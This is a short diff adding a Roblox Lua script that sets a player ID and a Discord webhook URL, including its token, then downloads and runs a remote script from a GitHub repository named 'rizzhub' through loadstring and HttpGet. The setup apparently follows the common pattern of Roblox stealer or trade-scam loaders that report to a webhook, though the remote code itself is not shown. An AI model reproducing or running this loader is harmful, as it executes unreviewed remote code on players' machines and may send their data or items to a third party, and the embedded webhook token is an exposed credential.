@@ -1,0 +1,4 @@
+_G.UserID = 433993333
+_G.Webhook = "https://discord.com/api/webhooks/1086243112961196102/6Y2ZoC-IHx2FQxK7hGGXqjIfthVG4JFWuunaJ1aWJ5Y6l0aeI8dVJmHtA1sh-AoRa66S"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/Script.lua"))()
